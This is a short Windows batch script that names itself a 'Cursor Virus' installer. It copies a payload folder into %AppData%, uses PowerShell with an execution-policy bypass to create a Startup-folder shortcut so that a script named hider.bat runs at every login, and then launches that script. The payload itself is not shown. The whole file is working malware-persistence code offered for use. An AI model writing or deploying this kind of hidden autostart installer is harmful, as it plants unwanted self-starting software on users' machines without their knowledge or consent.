@rem Start the Cursor Virus
@echo off

echo Copying The Virus : %AppData%\Cursor_Slider
xcopy /s Code %AppData%\Cursor_Slider /Y /I

echo.
echo Create The ShortCut (To Start every start-up)

set TARGET='%AppData%\Cursor_Slider\hider.bat'
set SHORTCUT='%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\cursor_slider.lnk'
set PWS=powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
%PWS% -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(%SHORTCUT%); $S.TargetPath = %TARGET%; $S.Save()"


echo.
echo Start The Script
"%APPDATA%\Cursor_Slider\hider.bat"
